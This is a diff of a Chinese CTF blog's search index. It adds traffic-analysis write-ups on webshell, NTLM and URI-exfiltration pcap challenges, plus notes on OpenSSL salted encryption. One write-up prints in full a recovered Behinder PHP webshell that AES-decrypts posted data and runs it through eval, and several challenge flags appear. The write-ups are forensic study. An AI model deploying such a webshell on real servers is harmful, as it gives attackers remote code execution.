@@ -659,7 +659,14 @@
   <entry>
     <title>CTF_MISC流量分析总结</title>
     <url>/2024/03/12/MISC-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h2 id="USB流量"><a href="#USB流量" class="headerlink" title="USB流量"></a>USB流量</h2><h2 id="TLS流量"><a href="#TLS流量" class="headerlink" title="TLS流量"></a>TLS流量</h2><h2 id="webshell流量"><a href="#webshell流量" class="headerlink" title="webshell流量"></a>webshell流量</h2><h2 id="sql注入流量"><a href="#sql注入流量" class="headerlink" title="sql注入流量"></a>sql注入流量</h2><h2 id="大流量"><a href="#大流量" class="headerlink" title="大流量"></a>大流量</h2><blockquote>
+    <content><![CDATA[<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h2 id="USB流量"><a href="#USB流量" class="headerlink" title="USB流量"></a>USB流量</h2><h2 id="TLS流量"><a href="#TLS流量" class="headerlink" title="TLS流量"></a>TLS流量</h2><h2 id="webshell流量"><a href="#webshell流量" class="headerlink" title="webshell流量"></a>webshell流量</h2><ul>
+<li>openssl 搞人心态<ul>
+<li>salted__</li>
+<li>php中的openssl</li>
+</ul>
+</li>
+</ul>
+<h2 id="sql注入流量"><a href="#sql注入流量" class="headerlink" title="sql注入流量"></a>sql注入流量</h2><h2 id="大流量"><a href="#大流量" class="headerlink" title="大流量"></a>大流量</h2><blockquote>
 <p>数据处理：<a class="link" href="https://zhuanlan.zhihu.com/p/35623547">模拟企业网络流量进行入侵溯源分析 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
 ]]></content>
@@ -668,6 +675,29 @@
       </categories>
       <tags>
         <tag>MISC-流量分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mad1sun_bad_days</title>
+    <url>/2024/02/29/Mad1sun-bad-days/</url>
+    <content><![CDATA[
+<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="38e0b744c166c42bafc82fbb60a28f502fcbe76f1b47d8c14a91936c7530d523">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8daeae4b6ca3ddbfd01ec051499d4b50f2d43a75fc586274852cb871e33d21bf4379b6e540a918d6d3898b90acb267cfb0ddf5d64f1ee868313bdc4b97bf3d931dec88407482e7e9be8213f445488ddb3c64a5abb3900b55e21520c4210cc93c206815002449a7fbc7b0009219b65730859170cf5115e41eaf416af24e7dd41c5eb763d76b810b52c82192d44c6136bf9875c6187f53f31ced3e97e06e54ed6a1c2012ab39916707500105ec43c703a60673a17e9c85244b01e93fab8a9d5a843dbc30325250cbe69299f6c47ea651530c0103fa7b114102889a969743508ad1ab59bb99b1752ec66ca9274f0f31e09564b2c7a8a799fa953c9006fa8f8c87f53428097f9a93ff9f44b48a48b2f4dea2b5dca2db228564700a77af39853e9e3038e0cfc0a05dd7616eaee5cc49ba9d59e91a9db21d3e460e620b0e68717157dfc4a3467451810fac4776ef433560454ec5ac582e1b05ada5b3e6f0a35dc836a08463482d980762ca1207f164f1942c8e797823ddadab5e5bfdc09089d383616e467a935978e86cb26b25df7f3aab4dd221ec829f412aa584b672635631233f500bd45f2d61e7885cc5fba1fcb63d4b30e298201be459858fa078a72629beaa750e</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>Mad1sun的生活小日记</category>
+      </categories>
+      <tags>
+        <tag>Mad1sun倒霉蛋的日常</tag>
       </tags>
   </entry>
   <entry>
@@ -976,6 +1006,51 @@
 </ul>
 <p><img lazyload src="/images/loading.svg" data-src="./image-20240324165718061.png" alt="image-20240324165718061"></p>
 <p>数据出现是重复的，两个取一个就可以得到flag:<code>flag&#123;Welc0me_GKC4F_m1siCCCCCC!&#125;</code></p>
+<h4 id="0x1C-NewStarCTF-2023-公开赛道-2-分析"><a href="#0x1C-NewStarCTF-2023-公开赛道-2-分析" class="headerlink" title="0x1C [NewStarCTF 2023 公开赛道]2-分析"></a>0x1C [NewStarCTF 2023 公开赛道]2-分析</h4><ul>
+<li>简单</li>
+</ul>
+<p><em>前面有个1-序章，是sql盲注数据分析，python直接写正则，没有写这道题的wp</em></p>
+<ul>
+<li>只需要追踪http流就可以看到登录用户名<code>best_admin</code>和有漏洞的php<code>index.php</code></li>
+<li>在get请求包里看到webshell代码：<code>wh1t3g0d.php</code></li>
+<li>flag为<code>flag&#123;md5(best_admin_index.php_wh1t3g0d.php)&#125;</code>，即<code>flag&#123;4069afd7089f7363198d899385ad688b&#125;</code></li>
+</ul>
+<h4 id="0x1D-SwampCTF2024-Notoriously-Tricky-Login-Mess-Part-1"><a href="#0x1D-SwampCTF2024-Notoriously-Tricky-Login-Mess-Part-1" class="headerlink" title="0x1D [SwampCTF2024] Notoriously Tricky Login Mess (Part 1)"></a>0x1D [SwampCTF2024] Notoriously Tricky Login Mess (Part 1)</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目描述：</span><br><span class="line">We found out a user account has been compromised on our network. We took a packet capture of the time that we believe the remote login happened. Can you find out what the username of the compromised account is?</span><br><span class="line">Flag format: swampCTF&#123;username&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>第一次遇到<strong>NTLM流量</strong>，这道题还挺简单的，要注意这题是<strong>NTLMv2</strong></li>
+</ul>
+<blockquote>
+<p>NTLMv2流量简单介绍：<a class="link" href="https://www.mike-gualtieri.com/posts/live-off-the-land-and-crack-the-ntlmssp-protocol">Live off the Land and Crack the NTLMSSP Protocol :: Mike Gualtieri (mike-gualtieri.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>NTLM流量详解（包含v1 v2）：<a class="link" href="https://cloud.tencent.com/developer/article/2227928">NTLM协议详解-腾讯云开发者社区-腾讯云 (tencent.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>例子：<a class="link" href="https://fdlucifer.github.io/2022/01/05/decrypt-winrm-traffic/">从pcap包中解密Winrm流量 | fdvoid0’s blog (fdlucifer.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<ul>
+<li>这道题需要获得username，结合ntlmssp，<em>NTLMSSP Message Type 3: Username Field</em>，找type 3的包，可以先过滤<code>ntlmssp</code>，在info里就能看到两个username：<code>\Administrator</code>和<code>\adamkadaban</code></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240408002756395.png" alt="image-20240408002756395"></p>
+<p>显然Administrator应该是本地用户，所以答案就是admkadaban</p>
+<ul>
+<li>包内容里面也有字段</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240408002935721.png" alt="image-20240408002935721"></p>
+<h4 id="0x1E-SwampCTF2024-New-C2-Channel"><a href="#0x1E-SwampCTF2024-New-C2-Channel" class="headerlink" title="0x1E [SwampCTF2024] New C2 Channel?"></a>0x1E [SwampCTF2024] New C2 Channel?</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目描述：</span><br><span class="line">Sometimes you can exfiltrate data with more than just plain text. Can you figure out how the attacker smuggled out the flag on our network?</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>题目的意思大概是数据以别的方式传递，挺新颖的这道题</li>
+<li>打开wireshark，过滤http，发现uri里藏了东西，而且是用8堆出来的字符。<em>这里我的想法本身是用tshark提取，然后xxd转一下，找完整的字符，太难看了，<strong>真是界于好看和难看之间，好难看</strong>；于是我缩小了过滤，<code>http.request.full_uri</code>，然后发现下一个包的uri数据，就是上一个包的数据，往左平移一列（物理）</em></li>
+<li>这是第一个包</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240408003632687.png" alt="image-20240408003632687"></p>
+<ul>
+<li>这是第二个包，往左平移了一列</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240408003655630.png" alt="image-20240408003655630"></p>
+<p><em>愚蠢如我，居然决定继续用tshark，每隔16个包提取，因为有16列，虽然也能基本看到所有字母，再加上半推理，能拿到大概的flag，但小问题有点多</em></p>
+<ul>
+<li>就在我愁着的时候，在wireshark里面查看各个包，我按了几下下键“⬇️”，emmmm，直接动起来了，，，，哈哈哈哈哈，有种白做了的感觉，总之，很奇妙，涨知识了。很有趣。秦家窃密搜。</li>
+<li>我也想出一道类似的题目哈哈哈哈，哪天来整整</li>
+</ul>
 <h3 id="中等"><a href="#中等" class="headerlink" title="中等"></a>中等</h3><h4 id="0x01-9-3-2-webshell混淆流量分析-webshell流量分析1"><a href="#0x01-9-3-2-webshell混淆流量分析-webshell流量分析1" class="headerlink" title="0x01 [9.3.2 webshell混淆流量分析]webshell流量分析1"></a>0x01 [9.3.2 webshell混淆流量分析]webshell流量分析1</h4><ul>
 <li>中等，菜刀</li>
 <li>设置筛选条件<code>http</code>，先看看http的数据包都有些啥，然后看到了有些是<code>/upload/1.php</code>，应该是上传了什么东西，追踪一下http流</li>
@@ -1323,6 +1398,41 @@
 <li>XMPP协议，tcp传了一个类似帮助手册的东西，需要连接服务器，记录一下wp</li>
 </ul>
 <p><a class="link" href="https://github.com/HugoDelval/inshack-2017/blob/master/challenges/misc/dga-75/writeup.md">inshack-2017/challenges/misc/dga-75/writeup.md 在 master ·雨果Delval/inshack-2017 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h4 id="0x10-NewStarCTF-2023-公开赛道-3-溯源"><a href="#0x10-NewStarCTF-2023-公开赛道-3-溯源" class="headerlink" title="0x10 [NewStarCTF 2023 公开赛道]3-溯源"></a>0x10 [NewStarCTF 2023 公开赛道]3-溯源</h4><ul>
+<li>第一次见到冰蝎流量</li>
+</ul>
+<p>PHP代码中可能存在eval、assert等关键词；</p>
+<p>jsp代码中可能会有get class(),get class loader()等字符特征。</p>
+<p>中国菜刀、蚁剑的攻击流量特征明显，容易被各类安全设备检测，而冰蝎是一款基于Java开发的动态加密通信流量的Webshell工具，由于通信流量被加密，传统的 WAF、IDS 设备难以检测，冰蝎最大特点就是对交互流量进行对称加密（冰蝎密文采用对称加密算法AES加密，加密后还会进行 base64 编码），且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测。　</p>
+<p>解题第一步，先找AES加密算法的密钥：</p>
+<p>服务器使用随机数MD5的高16位作为密钥，存储到会话的SESSIONID中，我们可以通过wireshark抓包看到。</p>
+<blockquote>
+<p><a class="link" href="https://blog.csdn.net/Myon5/article/details/134086143">NewStarCTF2023week4-溯源_ctf溯源-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p>冰蝎流量特征：<a class="link" href="https://www.freebuf.com/articles/network/345803.html">冰蝎V4.0流量分析到攻防检测 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<ul>
+<li>先<code>http.request.method==POST</code>过滤一下，第一个包，追踪http流，发现一个php</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">  <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">  <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">           <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">          &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>从代码中我们可以找到：<strong>AES加密的密钥</strong> <code>$key=&quot;e45e329feb5d925b&quot;; </code></p>
+<ul>
+<li>接下来由于POST请求包有很多，直接追踪tcp流又不能直接看到http的响应保文，先用tshark把这些包的tcp.stream提取出来：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">% tshark -nr &quot;溯源.pcap&quot; -Y &#x27;http.request.method == POST &#x27; -T fields -e &quot;tcp.stream&quot;|uniq|tr &#x27;\n&#x27; &#x27; &#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>uniq</code> 去掉重复</p>
+<p><code>tr &#39;\n&#39; &#39; &#39;  </code>把换行符替换成空格</p>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240327115420275.png" alt="image-20240327115420275"></p>
+<ul>
+<li>一个一个追踪http流，<strong>主要看响应报文</strong></li>
+</ul>
+<p>响应报文解密，只发现这个网站有用：<a class="link" href="http://tools.bugscaner.com/cryptoaes/">AES批量加密解密 - 在线工具 (bugscaner.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<ul>
+<li>再针对响应报文，解base64，最终发现了User和ip，所以flag为：<code>flag&#123;www-data_172.17.0.2&#125;</code></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240327120017382.png" alt="image-20240327120017382"></p>
+<p><em>这篇wp没怎么好好写，因为拖延了3天，细节也不想补充了，，，，</em></p>
 <h3 id="困难"><a href="#困难" class="headerlink" title="困难"></a>困难</h3><h4 id="0x01-蜘蛛侠呀"><a href="#0x01-蜘蛛侠呀" class="headerlink" title="0x01 蜘蛛侠呀"></a>0x01 蜘蛛侠呀</h4><ul>
 <li><p>困难在 很难猜到后面的gif隐写</p>
 </li>
@@ -1718,12 +1828,27 @@
 <p><a class="link" href="https://www.cnblogs.com/semishigure/p/9013131.html">ISCC 2018线上赛 writeup - yongchin - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
 <ul>
-<li>结合我们之前拿到的PASSWORD，应该是在AES中作为key加密的，稍微有点坑，经过尝试，在线网站秒了，但是cyberchef和openssl解密似乎都做不到，cyberchef的密钥长度仅支持16/24/32bytes，但是我们拿到的密钥是25个bytes。最后尝试在线网站，发现直接出了:sweat:</li>
+<li><p>结合我们之前拿到的PASSWORD，应该是在AES中作为key加密的，稍微有点坑，经过尝试，在线网站秒了，但是cyberchef和openssl命令行解密似乎都做不到，cyberchef的密钥长度仅支持16/24/32bytes，但是我们拿到的密钥是25个bytes。最后尝试在线网站，发现直接出了:sweat:</p>
+<p><em>补一句：后来发现openssl也可以解要加-md5</em></p>
+</li>
 </ul>
 <p>网址：<a class="link" href="https://www.sojson.com/encrypt_aes.html">在线AES加密 | AES解密 - 在线工具 (sojson.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><img lazyload src="/images/loading.svg" data-src="./image-20240324142427385.png" alt="image-20240324142427385"></p>
 <ul>
 <li>flag：<code>NKCTF&#123;d0e1183c-07c3-49ea-b048-addbe6cc1b20&#125;</code></li>
+</ul>
+<p><em>关于这道题，我涨了一点关于openssl的知识：</em></p>
+<ul>
+<li><p><em>正常来说，我们直接openssl 通过-pass设置密码，-a设置base64输出，加密flag就会得到U2FsdGVkX开头的base64字符串，解码后是<code>Salted__</code>，无论是CBC还是ECB都会默认加salt，用特定的算法生成密钥；所以用cyberchef或者别的常规AES是无法解密的</em></p>
+</li>
+<li><p><em>使用openssl命令行加解密可以发现，密文和password确定的情况下，salt和key是可以直接得出来的，使用-p打印key和salt，值得一提的是每次加密的salt和key都是不同的</em></p>
+</li>
+<li><p><img lazyload src="/images/loading.svg" data-src="./image-20240326220900741.png" alt="image-20240326220900741"></p>
+</li>
+<li><p><em>这道题显然是openssl，但是我也不知道这个网站到底用的什么mode，改了什么东西，总之得到的密文虽然长度正确，但是直接用openssl解密是失败的，也是挺搞。下次openssl先用在线网站解，，，</em></p>
+<p>破案了😭：</p>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240328164722796.png" alt="image-20240328164722796"></p>
+</li>
 </ul>
 ]]></content>
       <categories>
@@ -1731,29 +1856,6 @@
       </categories>
       <tags>
         <tag>MISC-流量分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mad1sun_bad_days</title>
-    <url>/2024/02/29/Mad1sun-bad-days/</url>
-    <content><![CDATA[
-<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="38e0b744c166c42bafc82fbb60a28f502fcbe76f1b47d8c14a91936c7530d523">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8daeae4b6ca3ddbfd01ec051499d4b50f2d43a75fc586274852cb871e33d21bf4379b6e540a918d6d3898b90acb267cfb0ddf5d64f1ee868313bdc4b97bf3d931dec88407482e7e9be8213f445488ddb3c64a5abb3900b55e21520c4210cc93c206815002449a7fbc7b0009219b65730859170cf5115e41eaf416af24e7dd41c5eb763d76b810b52c82192d44c6136bf9875c6187f53f31ced3e97e06e54ed6a1c2012ab39916707500105ec43c703a60673a17e9c85244b01e93fab8a9d5a843dbc30325250cbe69299f6c47ea651530c0103fa7b114102889a969743508ad1ab59bb99b1752ec66ca9274f0f31e09564b2c7a8a799fa953c9006fa8f8c87f53428097f9a93ff9f44b48a48b2f4dea2b5dca2db228564700a77af39853e9e3038e0cfc0a05dd7616eaee5cc49ba9d59e91a9db21d3e460e620b0e68717157dfc4a3467451810fac4776ef433560454ec5ac582e1b05ada5b3e6f0a35dc836a08463482d980762ca1207f164f1942c8e797823ddadab5e5bfdc09089d383616e467a935978e86cb26b25df7f3aab4dd221ec829f412aa584b672635631233f500bd45f2d61e7885cc5fba1fcb63d4b30e298201be459858fa078a72629beaa750e</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>Mad1sun的生活小日记</category>
-      </categories>
-      <tags>
-        <tag>Mad1sun倒霉蛋的日常</tag>
       </tags>
   </entry>
 </search>
